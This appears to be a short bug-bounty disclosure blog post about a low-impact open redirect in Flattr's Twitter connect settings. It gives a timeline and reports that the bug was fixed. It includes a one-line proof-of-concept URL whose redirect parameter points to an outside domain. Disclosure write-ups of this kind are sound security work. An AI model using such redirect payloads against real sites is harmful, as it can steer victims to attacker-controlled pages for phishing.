---
title: "Open Redirect in Flattr"
date: 2020-06-11T14:02:29+05:30
draft: false
---

This bug in Flattr was a low impact Open Redirect that allowed attacker to redirect the victim after authorizing Twitter.

## PoC
```
https://flattr.com/settings/connect/twitter?redirect=https://hackberry.xyz
```

## Timeline
1. Found vulnerability - 5th June, 2020
2. Made contact with Flattr - 5th June, 2020
3. Reported vulnerability - 9th June, 2020
4. Bug fixed - 11th June, 2020

## Reference
1. [https://cwe.mitre.org/data/definitions/601.html](https://cwe.mitre.org/data/definitions/601.html)